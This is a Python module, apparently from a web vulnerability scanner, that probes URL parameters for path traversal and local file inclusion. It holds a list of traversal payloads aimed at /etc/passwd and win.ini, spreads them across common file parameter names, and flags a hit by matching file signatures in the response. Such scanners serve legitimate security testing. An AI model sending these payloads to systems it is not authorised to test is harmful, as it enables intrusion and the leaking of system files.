"""Path traversal / LFI probes on common file parameters."""

from core.http import fetch

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

PARAM_NAMES = ("file", "path", "doc", "page", "include", "filename", "filepath", "document", "folder", "root", "pg")


def generate_tasks(url: str, config: dict) -> list:
    tasks = []
    discovered = config.get("discovered_params", [])
    all_params = list(dict.fromkeys(list(PARAM_NAMES) + discovered))
    
    for param in all_params:
        for payload in TRAVERSAL_PAYLOADS:
            tasks.append(
                {
                    "url": url,
                    "method": "GET",
                    "params": {param: payload},
                    "type": "Path Traversal",
                    "executor": test_path_traversal,
                }
            )
    return tasks


async def test_path_traversal(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"])
        if not resp or not text:
            return {"type": "Path Traversal", "url": task["url"], "vulnerable": False}
        body = text.lower()
        markers = (
            "root:x:",
            "[extensions]",
            "for 16-bit app support",
            "[boot loader]",
            "daemon:",
            "/bin/bash",
        )
        hit = any(m in body for m in markers)
        return {
            "type": "Path Traversal",
            "url": task["url"],
            "params": task["params"],
            "vulnerable": hit and resp.status == 200,
            "response": text[:800],
            "confidence": "high" if hit else "none",
        }
    except Exception as exc:
        return {"type": "Path Traversal", "url": task["url"], "error": str(exc), "vulnerable": False}
